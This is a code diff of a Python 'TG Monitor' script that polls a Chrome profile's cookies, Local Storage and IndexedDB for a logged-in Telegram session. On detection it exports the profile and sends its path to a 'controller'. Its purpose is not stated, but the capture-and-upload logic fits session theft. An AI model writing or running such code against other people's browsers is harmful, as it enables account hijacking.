@@ -196,7 +196,6 @@ def main():
             check_count += 1
             
             cookies = get_chrome_cookies()
-            token = get_telegram_token()
             
             # Check Local Storage for Telegram auth
             ls_path = CHROME_PROFILE / "Local Storage" / "leveldb"
@@ -206,26 +205,36 @@ def main():
                 if ls_size > 5000:
                     has_local_storage = True
             
+            # Check IndexedDB for Telegram
+            idb_path = CHROME_PROFILE / "IndexedDB"
+            has_telegram_idb = False
+            if idb_path.exists():
+                for item in idb_path.iterdir():
+                    if "telegram" in item.name.lower():
+                        size = sum(f.stat().st_size for f in item.rglob('*') if f.is_file())
+                        if size > 1000:
+                            has_telegram_idb = True
+                            break
+            
             # Log status every 10 checks
             if check_count % 10 == 0:
-                tg_cookies = [c for c in cookies if "telegram" in c.get("domain", "").lower()]
-                print(f"[TG Monitor] Check #{check_count}: cookies={len(cookies)}, tg_cookies={len(tg_cookies)}, has_token={token is not None}, ls={has_local_storage}", flush=True)
-                if tg_cookies:
-                    for c in tg_cookies[:3]:
-                        print(f"[TG Monitor]   - {c.get('name')}: {c.get('value')[:50] if c.get('value') else 'empty'}", flush=True)
+                print(f"[TG Monitor] Check #{check_count}: idb={has_telegram_idb}, ls={has_local_storage}", flush=True)
             
-            # Detect session: have token AND local storage
-            session_detected = token is not None and has_local_storage
+            # Detect session: have IndexedDB AND local storage
+            session_detected = has_telegram_idb and has_local_storage
             
             if session_detected and not session_captured:
-                print(f"[TG Monitor] *** TOKEN CAPTURED! ***", flush=True)
-                print(f"[TG Monitor] Token: {token[:50]}...", flush=True)
+                print(f"[TG Monitor] *** SESSION CAPTURED! ***", flush=True)
                 
                 session_captured = True
                 
-                # Send token to controller
-                result = send_to_controller("telegram_token", {
-                    "token": token
+                # Export profile
+                profile_path = export_session()
+                print(f"[TG Monitor] Exported to: {profile_path}", flush=True)
+                
+                # Send to controller
+                result = send_to_controller("telegram_session", {
+                    "profile_path": profile_path
                 })
                 print(f"[TG Monitor] Sent to controller: {result}", flush=True)
         
